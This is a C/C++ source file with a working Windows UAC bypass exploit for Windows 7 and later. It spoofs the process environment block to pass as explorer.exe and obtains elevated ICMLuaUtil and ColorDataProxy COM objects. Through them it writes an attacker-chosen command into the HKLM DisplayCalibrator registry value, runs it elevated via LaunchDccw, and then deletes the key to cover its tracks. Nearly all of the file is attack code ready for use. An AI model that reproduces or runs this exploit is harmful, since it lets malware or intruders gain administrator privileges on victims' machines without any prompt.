/* Exploits undocumented elevated COM interface ICMLuaUtil via process spoofing to edit registry
 then calls ColorDataProxy to trigger UAC bypass. Win 7 & up. */
#include <Windows.h>
#include <CommCtrl.h>
#include "ntos.h" // ntdll header
#include <objbase.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include "ICMLuaUtil.h"
#include "IColorDataProxy.h"

#pragma comment(lib,"Ole32.lib") 

// globals for callback and module
PWSTR ImageFileName = NULL;
PWSTR CommandLine = NULL;

/* enumerate modules callback handler */
VOID NTAPI LdrEnumModulesCallback(_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry, _In_ PVOID Context, _Inout_ BOOLEAN* StopEnumeration)
{
    PPEB Peb = NtCurrentPeb();
    SIZE_T      RegionSize = PAGE_SIZE;
    PWSTR FullDllName = ImageFileName;
    PWSTR BaseDllName = CommandLine;
    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
        RtlInitUnicodeString(&DataTableEntry->FullDllName, FullDllName);
        RtlInitUnicodeString(&DataTableEntry->BaseDllName, BaseDllName);
        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}

int main(int argc, char* argv[])
{
    NTSTATUS Status;
    WCHAR szMoniker[MAX_PATH];
    SIZE_T RegionSize = PAGE_SIZE;
    BOOL bRestore = FALSE;
    HRESULT hRes = E_FAIL, hInit = E_FAIL;
    ICMLuaUtil* CMLuaUtil = NULL;
    IColorDataProxy* ColorDataProxy = NULL;
    PVOID ElevatedObject = NULL, ElevatedObject2 = NULL;
    PPEB Peb = NtCurrentPeb();
    BIND_OPTS3 bop;
    LPWSTR pCMDpath;
    size_t sSize;
    if (argc != 2) {
        printf("[!] Error, you must supply a command\n");
        return EXIT_FAILURE;
    }
    pCMDpath = new TCHAR[MAX_PATH + 1];
    mbstowcs_s(&sSize, pCMDpath, MAX_PATH, argv[1], MAX_PATH);
    RtlAcquirePebLock();
    Status = NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&ImageFileName, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(Status)) {
        // should calculate these from the actual system root via environment
        lstrcpy(ImageFileName, L"c:\\Windows\\");
        lstrcat(ImageFileName, L"explorer.exe");
    }
    Status = NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&CommandLine, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(Status)) {
        lstrcpy(CommandLine, L"explorer.exe");
    }
    RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, ImageFileName);
    RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, CommandLine);
    LdrEnumerateLoadedModules(0, &LdrEnumModulesCallback, &bRestore);
    RtlReleasePebLock();
    // finished spoofing the PEB for elevated COM access
    hInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    do {
        RtlSecureZeroMemory(&bop, sizeof(bop));
        bop.cbStruct = sizeof(bop);
        bop.dwClassContext = CLSCTX_LOCAL_SERVER;
        lstrcpy(szMoniker, L"Elevation:Administrator!new:");
        lstrcat(szMoniker, T_CLSID_CMSTPLUA);
        REFIID riid = reinterpret_cast<const IID&>(IID_ICMLuaUtil);
        hRes = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject);
    } while (FALSE);
    CMLuaUtil = (ICMLuaUtil*)ElevatedObject;
    // set the payload into the registry key via privileged CMLuaUtil.
    hRes = CMLuaUtil->lpVtbl->SetRegistryStringValue(CMLuaUtil,HKEY_LOCAL_MACHINE,L"Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration",L"DisplayCalibrator",pCMDpath);
    // elevate the proxy dll and call it.
    do {
        RtlSecureZeroMemory(&bop, sizeof(bop));
        bop.cbStruct = sizeof(bop);
        bop.dwClassContext = CLSCTX_LOCAL_SERVER;
        lstrcpy(szMoniker, L"Elevation:Administrator!new:");
        lstrcat(szMoniker, T_CLSID_ColorDataProxy);
        REFIID riid = reinterpret_cast<const IID&>(IID_IColorDataProxy);
        hRes = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject2);
    } while (FALSE);
    ColorDataProxy = (IColorDataProxy*)ElevatedObject2;
    hRes = ColorDataProxy->lpVtbl->LaunchDccw(ColorDataProxy, 0);
    // delete the key & free the objects
    hRes = CMLuaUtil->lpVtbl->DeleteRegistryStringValue(CMLuaUtil, HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration", L"DisplayCalibrator");
    // clean up
    if (CMLuaUtil != NULL) {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }
    if (ColorDataProxy != NULL) {
        ColorDataProxy->lpVtbl->Release(ColorDataProxy);
    }
    if (hInit == S_OK)
        CoUninitialize();
    return EXIT_SUCCESS;
}